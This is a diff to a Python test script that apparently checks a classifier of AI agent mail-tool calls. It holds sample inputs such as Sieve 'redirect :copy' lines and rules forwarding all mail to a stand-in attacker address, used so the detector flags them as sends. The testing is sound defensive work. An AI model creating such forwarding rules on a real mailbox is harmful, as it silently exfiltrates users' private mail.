@@ -216,6 +216,24 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
     check(f"{n_fwd} forward calls (servers x names x shapes) are a send via mail_rule_forward", bad_fwd == 0, f"{bad_fwd} differ")
     check("readers stay None whatever the input", bad_reader == 0, f"{bad_reader} differ")
     check("clean non-reader calls and prose drafts keep their class", bad_clean == 0, f"{bad_clean} differ")
+    bad_n4 = [c["tool"] for c in NI["reviewer_n4"]
+              if ee.mail_tool_action(c["tool"], c["input"]) != "send" or ee.mail_rule_forward(c["tool"], c["input"]) is not True]
+    check("N4 B2: the reviewer's 5 rule / script / filter inputs (Sieve redirect, forward instruction, fwd) are a send", not bad_n4, f"{bad_n4}")
+    narrow = lambda v: ee._has_forward_key_name(v, True, True)
+    check("N4 B2: narrow patterns read free text only for a non-draft tool",
+          narrow({"content": 'redirect :copy "x@evil.example";'}) and narrow({"description": "forward every message to x@evil.example"})
+          and narrow({"body": "FWD: all mail to x@evil.example"})
+          and not ee._has_forward_key_name({"content": 'redirect :copy "x@evil.example";'}, True, False)
+          and not ee._has_forward_key_name({"body": "please forward this to x@y.example"}, True, False))
+    check("N4 B2: narrow patterns spare prose, a forward word far from an address, label / folder identifiers and straightforward",
+          not narrow({"description": "forward looking statement, mail me at some point"}) and not narrow({"body": "straightforward x@y.example"})
+          and not narrow({"folder": "forward to x@evil.example"}) and not narrow({"addLabelIds": ["fwd x@evil.example"]})
+          and not narrow({"body": "forward " + "a" * 41 + " x@y.example"}) and not narrow({"body": 'redirect x@y.example'}))
+    check("N4 B2: plain draft vs rule / script / settings class",
+          ee._is_plain_draft(["create_draft"], ["draft"]) and not ee._is_plain_draft(["update_settings"], ["draft"])
+          and not ee._is_plain_draft(["manage_rules"], [None]) and not ee._is_plain_draft(["update_sieve_script"], ["draft"])
+          and not ee._is_plain_draft(["create_forwarding_address"], ["draft"]))
+    check("N4 B2: fwd is a value word", ee._has_forward_key_name({"action": "fwd"}) and not ee._has_forward_key_name({"x": "offwd"}))
     check("D-B2: update_auto_forwarding with a forwardTo is a send on outlook, ms365, claude_ai_Outlook",
           all(ee.mail_tool_action(f"mcp__{s}__update_auto_forwarding", {"forwardTo": "x"}) == "send" for s in ("outlook", "ms365", "claude_ai_Outlook")))
     check("6151bb4d rule keeps counting a bare address for a filter name", ee.mail_tool_action("mcp__gmail__create_filter", {"criteria": {"from": "x@y.hu"}}) == "send")
